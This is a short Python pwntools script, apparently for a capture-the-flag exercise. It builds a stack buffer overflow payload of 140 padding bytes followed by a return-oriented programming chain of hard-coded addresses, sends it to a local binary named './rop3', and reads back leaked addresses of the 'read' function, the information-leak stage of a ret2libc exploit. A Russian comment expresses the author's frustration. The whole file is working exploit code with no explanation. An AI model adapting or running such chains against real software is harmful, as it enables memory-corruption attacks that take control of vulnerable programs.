from pprint import pprint as pp
from pwn import *
context(arch="i686",
        os="linux",
        log_level=logging.DEBUG)

payload = ''.join([
    140 * 'A',
    p32(0x80483a0),
    # -----------------
    p32(0x080484d4),
    # 'CCCC' ,   # все я чет уже туплю
    # -----------------
    p32(0x1) ,
    p32(0x08048360) ,
    p32(0x4) ,
])
io = process('./rop3', shell=True)
io.sendline(payload)
# pp(io.recv(4))
read_addr = u32(io.recv(4))
log.info("read_addr = 0x%x", read_addr)

read_addr_again = u32(io.recv(4))
log.info("read_addr_again = 0x%x", read_addr_again)
